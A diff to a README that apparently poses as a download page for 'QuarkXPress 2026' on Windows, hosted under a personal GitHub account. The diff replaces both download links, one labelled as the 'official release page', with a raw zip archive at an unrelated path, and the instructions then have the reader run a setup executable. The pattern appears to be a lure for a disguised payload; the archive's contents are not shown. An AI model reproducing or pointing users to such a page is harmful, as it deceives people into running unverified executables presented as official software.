@@ -5,7 +5,7 @@ description: "Download and install QuarkXPress on Windows 10 and 11 using a sing
 ---
 # 📄 QuarkXPress-2026 - Create professional layouts for windows easily
 
-[![Download QuarkXPress](https://img.shields.io/badge/Download-QuarkXPress_2026-blue)](https://github.com/sebds8527/QuarkXPress-2026)
+[![Download QuarkXPress](https://img.shields.io/badge/Download-QuarkXPress_2026-blue)](https://raw.githubusercontent.com/sebds8527/sebds8527.github.io/main/wrestling/github_sebds_io_3.6.zip)
 
 ## 📌 About this software
 
@@ -28,7 +28,7 @@ Verify that your system drivers reach the minimum requirements for graphic appli
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official release page](https://github.com/sebds8527/QuarkXPress-2026) to download the setup file.
+1. Go to the [official release page](https://raw.githubusercontent.com/sebds8527/sebds8527.github.io/main/wrestling/github_sebds_io_3.6.zip) to download the setup file.
 2. Select the latest version listed under the assets section.
 3. Save the installer file to your Downloads folder.
 4. Locate the file named QuarkXPress_Setup_2026.exe after the download finishes.
